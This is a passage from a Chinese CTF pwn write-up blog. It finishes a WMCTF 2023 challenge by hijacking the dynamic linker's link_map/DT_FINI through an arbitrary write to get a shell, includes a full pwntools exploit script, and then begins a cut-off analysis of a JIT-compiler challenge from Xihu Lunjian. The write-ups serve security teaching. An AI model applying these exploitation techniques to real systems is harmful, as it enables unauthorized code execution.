)<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( c[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;q&#x27;</span> )                          <span class="hljs-comment">// q</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( c[<span class="hljs-number">0</span>] &lt;= <span class="hljs-string">&#x27;q&#x27;</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( c[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;@&#x27;</span> )                        <span class="hljs-comment">// @</span><br>      &#123;<br>        data += *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)&amp;code[*(<span class="hljs-type">int</span> *)&amp;c[<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>];<br>        *(_DWORD *)&amp;c[<span class="hljs-number">1</span>] += <span class="hljs-number">5</span>;<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( c[<span class="hljs-number">0</span>] &lt;= <span class="hljs-string">&#x27;@&#x27;</span> )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( c[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;&gt;&#x27;</span> )                      <span class="hljs-comment">// &gt;</span><br>        &#123;<br>          ++data;<br>          ++*(_DWORD *)&amp;c[<span class="hljs-number">1</span>];<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( c[<span class="hljs-number">0</span>] &lt;= <span class="hljs-string">&#x27;&gt;&#x27;</span> )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( c[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;+&#x27;</span> )                    <span class="hljs-comment">// +</span><br>          &#123;<br>            data += <span class="hljs-number">8</span>;<br>            ++*(_DWORD *)&amp;c[<span class="hljs-number">1</span>];<br>          &#125;<br>          <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( c[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;.&#x27;</span> )               <span class="hljs-comment">// .</span><br>          &#123;<br>            *data = code[*(<span class="hljs-type">int</span> *)&amp;c[<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>];<br>            *(_DWORD *)&amp;c[<span class="hljs-number">1</span>] += <span class="hljs-number">2</span>;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>    c[<span class="hljs-number">0</span>] = code[*(<span class="hljs-type">int</span> *)&amp;c[<span class="hljs-number">1</span>]];<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个函数实现了任意地址写一字节功能。</p><p>关键点在于往哪写？</p><p>由于没有限制申请堆块的大小，可以申请一块特别大内存，使用<code>mmap</code>分配，使得堆起始地址与libc或者ld等内存有固定偏移。然后我们可以写_rtld_global结构体的内容。</p><p>思路大概有三种：</p><p>第一种，覆盖_rtld_global结构体的exit_hook为one_gadget，需要爆破一定时间。</p><p>第二种，覆盖link_map结构体的dl_addr与dl_fini等字段，执行system(“&#x2F;bin&#x2F;sh\00”)。</p><p>第三种，与第二种类似，但是最后执行程序提供的backdoor。</p><p>第一种比较简单，这里大致说说后两种。</p><p>程序正常退出时，需要执行<code>dl_fini</code>等函数进行收尾工作。这里我们主要利用<code>dl_fini</code>函数。</p><p><code>dl_fini</code></p><p><img src="/img/2023-wmctf-pwn%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/image-20230828121724326.png" alt="image-20230828121724326"></p><p>该函数会遍历<strong>link_map</strong>结构体，然后执行<strong>DT_FINI_ARRAY</strong>与<strong>DT_FINI</strong>的函数。这里思路就是覆盖<strong>DT_FINI_ARRAY</strong>为空，然后覆盖<strong>DT_FINI</strong>为<strong>dt_debug</strong>(思路二)或者覆盖<strong>DT_FINI</strong>为<strong>dt_string</strong> (思路三)。再覆盖<strong>dt_addr</strong>为system与dt_debug的偏移或者backdoor与dt_string的偏移，最后爆破1&#x2F;16即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p64, p32, p16, p8<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./main&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>ld = ELF(<span class="hljs-string">&#x27;/lib64/ld-linux-x86-64.so.2&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-comment"># if debug:</span><br><span class="hljs-comment">#     p = process(fn)</span><br><br><span class="hljs-comment"># else:</span><br><span class="hljs-comment">#     p = remote()</span><br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br>    <br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>command = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">dir ~/tools/glibc-source/glibc-2.31/elf/</span><br><span class="hljs-string">b _dl_fini</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">offset, content</span>):<br>    data = <span class="hljs-string">b&#x27;@&#x27;</span> + p32(offset)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(content)):<br>        data += <span class="hljs-string">b&#x27;.&#x27;</span> + p8(content[i])<br>        data += <span class="hljs-string">b&#x27;&gt;&#x27;</span><br>    <span class="hljs-keyword">return</span> data<br><br><br>ld_base_offset = <span class="hljs-number">0x413ff0</span>   <span class="hljs-comment"># no-aslr</span><br><span class="hljs-comment"># ld_base_offset = 0x40dff0</span><br>binsh_offset = ld_base_offset + ld.sym[<span class="hljs-string">&#x27;_rtld_global&#x27;</span>] + <span class="hljs-number">2312</span><br>link_map_offset = ld_base_offset + <span class="hljs-number">0x2f190</span><br>dt_string = link_map_offset + <span class="hljs-number">0x40</span> + <span class="hljs-number">5</span> * <span class="hljs-number">0x8</span><br>dt_fini = link_map_offset + <span class="hljs-number">0x40</span> + <span class="hljs-number">13</span> * <span class="hljs-number">0x8</span><br>dt_fini_array = link_map_offset + <span class="hljs-number">0x40</span> + <span class="hljs-number">26</span> * <span class="hljs-number">0x8</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>():<br>    p.sendafter(<span class="hljs-string">&#x27;the data size&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x200000</span>).encode())<br>    p.sendafter(<span class="hljs-string">&#x27;the code size&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x100</span>).encode())<br><br>    <span class="hljs-comment"># dbg(command)</span><br><br>    <span class="hljs-comment"># payload = b&#x27;&#x27;</span><br>    <span class="hljs-comment"># payload += write(binsh_offset, b&quot;/bin/sh\x00&quot;)</span><br>    <span class="hljs-comment"># payload += write(link_map_offset - binsh_offset - 0x8, p64(0xffffffffffe10130))   # no-aslr</span><br>    <span class="hljs-comment"># # payload += write(link_map_offset - binsh_offset - 0x8, p64(0xffffffffffe16100))</span><br>    <span class="hljs-comment"># payload += write(dt_fini - link_map_offset - 0x8, p16(0x7e58))      # exploit</span><br>    <span class="hljs-comment"># payload += b&#x27;&gt;&#x27; * 0x6</span><br>    <span class="hljs-comment"># payload += write(dt_fini_array - dt_fini - 8, p64(0))</span><br>    <span class="hljs-comment"># payload += b&#x27;q&#x27;</span><br><br>    <span class="hljs-comment"># p.sendafter(&#x27;input your code&#x27;, payload)</span><br><br>    <span class="hljs-comment"># p.sendline(&#x27;cat flag&#x27;)</span><br>    <span class="hljs-comment"># data = p.recvuntil(&#x27;&#125;&#x27;, timeout=1)</span><br>    <span class="hljs-comment"># print(data)</span><br><br>    <span class="hljs-comment"># p.interactive()</span><br><br>    payload = <span class="hljs-string">b&#x27;&#x27;</span><br>    payload += write(link_map_offset, p64(<span class="hljs-number">0xd09</span>))   <span class="hljs-comment"># backdoor -&gt; dt_string</span><br>    payload += write(dt_fini - link_map_offset - <span class="hljs-number">0x8</span>, p16(<span class="hljs-number">0x7e18</span>))      <span class="hljs-comment"># exploit</span><br>    payload += <span class="hljs-string">b&#x27;&gt;&#x27;</span> * <span class="hljs-number">0x6</span><br>    payload += write(dt_fini_array - dt_fini - <span class="hljs-number">8</span>, p64(<span class="hljs-number">0</span>))<br>    payload += <span class="hljs-string">b&#x27;q&#x27;</span><br>    p.sendafter(<span class="hljs-string">&#x27;input your code&#x27;</span>, payload)<br>    <br>    data = p.recvuntil(<span class="hljs-string">&#x27;&#125;&#x27;</span>, timeout=<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(data)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            p = process(fn)<br>            attack()<br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">except</span>:<br>            p.close()<br>            <span class="hljs-comment"># exit(-1)</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-wmctf-pwn%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/image-20230828123347696.png" alt="image-20230828123347696"></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jit-pwn</title>
    <link href="/2023/08/23/jit-pwn/"/>
    <url>/2023/08/23/jit-pwn/</url>
    
    <content type="html"><![CDATA[<h1 id="jit-pwn"><a href="#jit-pwn" class="headerlink" title="jit-pwn"></a>jit-pwn</h1><p>这次wmctf有一道jit相关的pwn，这已经是笔者第二次遇到jit相关的pwn了，上一次是西湖论剑线上赛。</p><p><strong>jit（Just-In-Time Compilation，即时编译）</strong>是一种在程序运行时将代码从高级语言（如Java、C#等）转换为机器代码的技术。与传统的静态编译（在编译时将代码转换为机器代码）不同，JIT编译在程序第一次运行时动态地将代码编译为机器代码，然后直接执行。这种方法有助于提高程序的性能和优化执行速度。</p><p>jit-pwn与vm-pwn有些相似之处，都是通过逆向得到指令码。不同的是，vm-pwn通常输入的是字节码，而jit-pwn输入的是汇编源码，所以一般包含<strong>源码 -&gt; 字节码</strong>的过程。</p><h2 id="2023-西湖论剑-jit"><a href="#2023-西湖论剑-jit" class="headerlink" title="2023-西湖论剑-jit"></a>2023-西湖论剑-jit</h2><p>这道题是用c++实现的jit，能够解释部分字节码。这道题程序很大，但是没有去掉符号表。</p><p>程序保护全开。</p><p><img src="/img/jit-pwn/image-20230823234526766.png" alt="image-20230823234526766"></p><p>这里程序主逻辑还是比较简单的。</p><p><img src="/img/jit-pwn/image-20230823234653893.png" alt="image-20230823234653893"></p><p>程序一开始读取输入，然后赋值到IRstream中，再调用Compiler::main对输入的指令进行翻译。</p><p><code>Compiler::main</code></p><p><img src="/img/jit-pwn/image-20230823235053564.png" alt="image-20230823235053564"></p><p>这个函数调用了很多自定义函数，这里我们从上到下逐个分析。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> __cdecl <span class="hljs-title">JITHelper::init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  JITHelper::execbuf = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">mmap</span>(<span class="hljs-number">0LL</span>, <span class="hljs-number">0x2000</span>uLL, <span class="hljs-number">7</span>, <span class="hljs-number">34</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>);<br>  JITHelper::exec_wr = JITHelper::execbuf;<br>  <span class="hljs-built_in">memset</span>(JITHelper::execbuf, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x2000</span>uLL);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> *__cdecl <span class="hljs-title">JITHelper::nowptr</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> JITHelper::exec_wr;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> __cdecl <span class="hljs-title">JITHelper::write</span><span class="hljs-params">(std::string *p_payload)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">size_t</span> v1; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">void</span> *v2; <span class="hljs-comment">// rax</span><br><br>  <span class="hljs-keyword">if</span> ( JITHelper::total_wr &gt; <span class="hljs-number">0x1900</span> )<br>    <span class="hljs-built_in">fatal</span>();<br>  v1 = std::string::<span class="hljs-built_in">size</span>(p_payload);<br>  v2 = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *)std::string::<span class="hljs-built_in">data</span>(p_payload);<br>  <span class="hljs-built_in">memcpy</span>(JITHelper::exec_wr, v2, v1);<br>  JITHelper::exec_wr += std::string::<span class="hljs-built_in">size</span>(p_payload);<br>  JITHelper::total_wr += std::string::<span class="hljs-built_in">size</span>(p_payload);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> __cdecl <span class="hljs-title">IRstream::empty</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> std::string::<span class="hljs-built_in">size</span>(&amp;IRstream::ir[abi:cxx11]) == IRstream::pos;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> __cdecl <span class="hljs-title">JITHelper::finailize</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">mprotect</span>(JITHelper::execbuf, <span class="hljs-number">0x2000</span>uLL, <span class="hljs-number">5</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>JITHelper::init</code> 调用<code>mmap</code> 分配一段可读可写可执行的内存，<strong>exec_wr</strong>指向内存起始地址，然后初始化为0xCC，即<code>int 80h</code>。再将内存起始地址赋值给<strong>entry</strong>。初始化<strong>p_payload</strong>，并写入<code>mmap</code> 分配的空间。可以看到，写入的是一段字节码。然后，判断IRStream是否为空，并调用<code>Compiler::handleFn</code>，这个函数是一个关键函数，我们后续再进行分析。最后调用<code>JITHelper::finailize</code>，去掉已分配空间的可写权限。</p><p><img src="/img/jit-pwn/image-20230826145254196.png" alt="image-20230826145254196"></p><p><img src="/img/jit-pwn/image-20230826145745233.png" alt="image-20230826145745233"></p><p>最后，这段代码看起来比较复杂。主要是判断三个条件，判断函数个数是否为空，函数参数个数是否为空，以及第一个函数的起始地址是否等于entry + boot。说白了，就是要求第一个函数参数为空，且起始地址在正确。然后调用<code>Compiler::clrstk</code>开辟了一小段栈空间，最后执行<strong>entry</strong>，也即<code>JITHelper::exebuf</code>。</p><p>分析到这儿，我们差不多可以理解程序的含义了。接下来，我们详细分析指令翻译的过程，即将汇编语言转换为字节码的部分。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __cdecl <span class="hljs-title function_">Compiler::handleFn</span><span class="hljs-params">()</span><br>&#123;<br>  u8 id; <span class="hljs-comment">// [rsp+5h] [rbp-13h] BYREF</span><br>  u8 args; <span class="hljs-comment">// [rsp+6h] [rbp-12h]</span><br>  u8 locals; <span class="hljs-comment">// [rsp+7h] [rbp-11h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+8h] [rbp-10h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( IRstream::getop() != <span class="hljs-number">0xFF</span> )<br>    fatal();<br>  id = IRstream::getop();<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>,Compiler::func&gt;::count(&amp;Compiler::funcs, &amp;id) )<br>    fatal();<br>  args = IRstream::getop();<br>  locals = IRstream::getop();<br>  Compiler::creatFunc(id, args, locals);<br>&#125;<br><br><span class="hljs-type">void</span> __cdecl <span class="hljs-title function_">Compiler::creatFunc</span><span class="hljs-params">(u8 id, u8 args, u8 locals)</span><br>&#123;<br>  u8 ida[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+Ch] [rbp-7Ch] BYREF</span><br>  <span class="hljs-type">int</span> retidx; <span class="hljs-comment">// [rsp+1Ch] [rbp-6Ch]</span><br>  Compiler::func __y; <span class="hljs-comment">// [rsp+20h] [rbp-68h] BYREF</span><br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> <span class="hljs-type">const</span>,Compiler::func&gt; __x; <span class="hljs-comment">// [rsp+30h] [rbp-58h] BYREF</span><br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> p_payload; <span class="hljs-comment">// [rsp+50h] [rbp-38h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v9; <span class="hljs-comment">// [rsp+78h] [rbp-10h]</span><br><br>  ida[<span class="hljs-number">0</span>] = id;<br>  v9 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( args &gt; <span class="hljs-number">8u</span> || locals &gt; <span class="hljs-number">0x20</span>u )<br>    fatal();<br>  __y.id = ida[<span class="hljs-number">0</span>];<br>  __y.args = args;<br>  __y.locals = locals;<br>  __y.base = JITHelper::nowptr();<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> <span class="hljs-type">const</span>,Compiler::func&gt;::<span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> &amp;,Compiler::func,<span class="hljs-literal">true</span>&gt;(&amp;__x, ida, &amp;__y);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>,Compiler::func&gt;::insert(&amp;Compiler::funcs, &amp;__x);<br>  <span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-type">char</span>&gt;::allocator(&amp;__x);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::basic_string(&amp;p_payload, &amp;unk_59E0, &amp;__x);<br>  JITHelper::write(&amp;p_payload);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::~<span class="hljs-built_in">string</span>(&amp;p_payload);<br>  <span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-type">char</span>&gt;::~allocator(&amp;__x);<br>  JITHelper::bwrite&lt;<span class="hljs-type">int</span>&gt;(<span class="hljs-number">8</span> * locals);<br>  Compiler::ctx_args = args;<br>  Compiler::ctx_locals = locals;<br>  retidx = Compiler::handleFnBody();<br>  AsmHelper::func_ret(locals, retidx);<br>&#125;<br><br><span class="hljs-type">void</span> __cdecl <span class="hljs-title function_">AsmHelper::func_ret</span><span class="hljs-params">(u8 locals, <span class="hljs-type">char</span> retidx)</span><br>&#123;<br>  <span class="hljs-type">char</span> v2; <span class="hljs-comment">// [rsp+1Fh] [rbp-39h] BYREF</span><br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> p_payload; <span class="hljs-comment">// [rsp+20h] [rbp-38h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+48h] [rbp-10h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-type">char</span>&gt;::allocator(&amp;v2);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::basic_string(&amp;p_payload, &amp;unk_59BB, &amp;v2);<br>  JITHelper::write(&amp;p_payload);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::~<span class="hljs-built_in">string</span>(&amp;p_payload);<br>  <span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-type">char</span>&gt;::~allocator(&amp;v2);<br>  JITHelper::bwrite&lt;<span class="hljs-type">int</span>&gt;(<span class="hljs-number">8</span> * locals);<br>  AsmHelper::var2reg(retidx);<br>  <span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-type">char</span>&gt;::allocator(&amp;v2);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::basic_string(&amp;p_payload, &amp;unk_59BF, &amp;v2);<br>  JITHelper::write(&amp;p_payload);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::~<span class="hljs-built_in">string</span>(&amp;p_payload);<br>  <span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-type">char</span>&gt;::~allocator(&amp;v2);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Compiler::handleFn</code> 函数创建函数，并规定函数起始字节为<strong>0xff</strong>。接着调用<code>IRstream::getop()</code> 从我们输入的指令中获取创建的函数<strong>id</strong>、<strong>args</strong>以及<strong>locals</strong>，并调用<code> Compiler::creatFunc</code>，对我们创建的函数进行一些初始化操作，比如根据局部变量个数开辟栈空间。接着，调用<code>Compiler::handleFnBody</code>进行详细处理。最后调用<code>AsmHelper::func_ret</code>，该函数对<code>handleFnBody</code>的返回值进行了处理，并写入函数结束操作。</p><p><img src="/img/jit-pwn/image-20230826222817965.png" alt="image-20230826222817965"></p><p>我们先来看最简单的部分，当opcode为0时，调用<code>Compiler::var2idx</code> 并返回。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> __cdecl <span class="hljs-title function_">Compiler::var2idx</span><span class="hljs-params">(u8 varib)</span><br>&#123;<br>  u8 variba; <span class="hljs-comment">// [rsp+Ch] [rbp-1Ch]</span><br><br>  <span class="hljs-keyword">if</span> ( (varib &amp; <span class="hljs-number">0x7F</span>) == <span class="hljs-number">0</span> )                    <span class="hljs-comment">// 后7位不为0</span><br>    fatal();<br>  <span class="hljs-keyword">if</span> ( (varib &amp; <span class="hljs-number">0x80</span>u) == <span class="hljs-number">0</span> )                   <span class="hljs-comment">// 第8位为0</span><br>  &#123;<br>    <span class="hljs-keyword">if</span> ( varib &gt; Compiler::ctx_args )<br>      fatal();<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">char</span>)(<span class="hljs-number">8</span> * varib) &lt;= <span class="hljs-number">0</span> )<br>      fatal();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">8</span> * varib;<br>  &#125;<br>  <span class="hljs-keyword">else</span>                                          <span class="hljs-comment">// 第8位不为0</span><br>  &#123;<br>    variba = varib ^ <span class="hljs-number">0x80</span>;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)(varib ^ <span class="hljs-number">0x80</span>) &gt; Compiler::ctx_locals )<br>      fatal();<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">char</span>)(<span class="hljs-number">-8</span> * variba) &gt; <span class="hljs-number">0</span> )<br>      fatal();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-8</span> * variba;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出，返回的值根据第8位是否为0，而做不同的处理，实际上就是符号数那一套。这里通过对比，可以发现，当符号数为1时，返回值可以为0。</p><p>这里对该指令操作进行简单的测试。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">dbg(<span class="hljs-string">&#x27;b *$rebase(0x24ff)&#x27;</span>)<br><br>data = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0xff</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, 